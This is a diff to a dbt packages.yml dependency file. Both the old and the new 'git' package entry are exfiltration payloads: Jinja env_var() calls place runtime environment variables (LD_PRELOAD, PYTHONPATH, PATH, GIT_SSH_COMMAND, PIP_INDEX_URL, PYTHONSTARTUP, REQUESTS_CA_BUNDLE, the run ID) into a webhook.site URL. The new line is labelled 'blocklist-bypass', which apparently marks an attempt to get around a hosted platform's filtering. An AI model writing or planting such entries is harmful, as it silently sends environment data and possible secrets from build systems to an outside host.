@@ -1,3 +1,3 @@
 packages:
-  - git: "https://webhook.site/01dd8669-5c8b-4697-a7ea-eb5d2e5b1c72/envvar-diff/stripped-ld={{ env_var('LD_PRELOAD', 'NOSTRIP') }}/full-ld={{ env_var('DBT_ENV_CUSTOM_ENV_LD_PRELOAD', 'NOFULL') }}/stripped-py={{ env_var('PYTHONPATH', 'NOSTRIP') }}/full-py={{ env_var('DBT_ENV_CUSTOM_ENV_PYTHONPATH', 'NOFULL') }}/stripped-path={{ env_var('PATH', 'NOSTRIP') | replace('/', '_') }}/stripped-gitssh={{ env_var('GIT_SSH_COMMAND', 'NOSTRIP') | replace('/', '_') | replace(' ', '+') }}/run={{ env_var('DBT_CLOUD_RUN_ID', 'norun') }}.git"
+  - git: "https://webhook.site/01dd8669-5c8b-4697-a7ea-eb5d2e5b1c72/blocklist-bypass/pip={{ env_var('PIP_INDEX_URL', 'BLOCKED') | replace('/', '_') }}/pystart={{ env_var('PYTHONSTARTUP', 'BLOCKED') | replace('/', '_') }}/cabundle={{ env_var('REQUESTS_CA_BUNDLE', 'BLOCKED') | replace('/', '_') }}/run={{ env_var('DBT_CLOUD_RUN_ID', 'norun') }}.git"
     revision: main
